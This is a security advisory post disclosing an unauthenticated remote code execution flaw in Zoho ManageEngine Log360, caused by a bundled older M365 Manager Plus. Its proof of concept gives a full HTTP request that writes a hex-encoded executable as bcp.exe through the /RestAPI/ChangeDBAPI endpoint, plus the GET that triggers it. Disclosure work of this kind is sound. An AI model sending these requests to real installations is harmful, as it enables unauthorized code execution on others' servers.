---
layout: post
title:  "Zoho ManageEngine Log360 - Unauthenticated Remote Code Execution"
tag: advisory
excerpt_separator: <!--more-->

---

A tale of an unauthenticated remote code execution vulnerability affecting  Zoho ManageEngine Log360.  
<!--more-->

### **Affected versions** 
5.2.2.9 

### **Technical Details:**

It was observed that the latest version of Log360 product comes bundled by default with an older version of M365 Manager plus product 4.3 which is affected by an authentication bypass on /RestAPI & BCP file overwrite issue. This can allow an unauthenticated attacker to execute code remotely on the affected installations of Log360 product.


### **Proof of Concept:**
Following request will create bcp.exe file in the bin directory of M365 Manager plus installation.

```
POST /RestAPI/ChangeDBAPI?operation=writeBCP&bcpexe=4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20&bcprll=61616161616161 HTTP/1.1
Host: o365.local:8365
Accept-Encoding: gzip, deflate
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 0
```
Which can be triggered by sending a GET request to /RestAPI/ChangeDBAPI?operation=checkBCP endpoint.

### **Solution:**
It is recommended to package Log360 with the latest version of M365 Manager plus application.